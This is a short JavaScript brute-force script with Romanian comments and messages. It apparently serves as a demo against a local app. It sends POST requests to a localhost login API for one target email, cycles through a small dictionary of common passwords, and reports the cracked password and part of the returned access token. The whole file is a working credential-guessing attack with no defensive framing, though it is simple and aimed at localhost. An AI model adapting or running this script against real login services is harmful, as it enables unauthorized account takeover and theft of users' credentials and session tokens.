
const emailTinta = "simplu@gmail.com";

const dictionarParole = [
    "123456",
    "parola",
    "qwerty",
    "admin",
    "12345678",
    "ParolaMeaSuperSecreta123",
    "roberto",
    "simplu"
];

async function pornesteAtac() {
    console.log(`Brute-Force pe contul: ${emailTinta}...\n`);

    for (let i = 0; i < dictionarParole.length; i++) {
        const parolaTestata = dictionarParole[i];
        console.log(`[Incercarea ${i + 1}] Testam parola: "${parolaTestata}" ...`);

        try {
            const response = await fetch("http://localhost:3000/api/auth/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email: emailTinta, password: parolaTestata }),
            });

            if (response.ok) {
                const data = await response.json();
                console.log(`\nSUCCES! Am spart contul!`);
                console.log(`Parola corectă este: "${parolaTestata}"`);
                console.log(`Token acces obținut: ${data.token.substring(0, 30)}...\n`);
                return;
            } else {
                console.log(`Eșuat (Serverul a returnat eroare). Trecem la următoarea.\n`);
            }
        } catch (error) {
            console.log("Eroare de rețea. Serverul este pornit?");
            return;
        }
    }
    console.log("Nu am găsit parola.");
}

pornesteAtac();
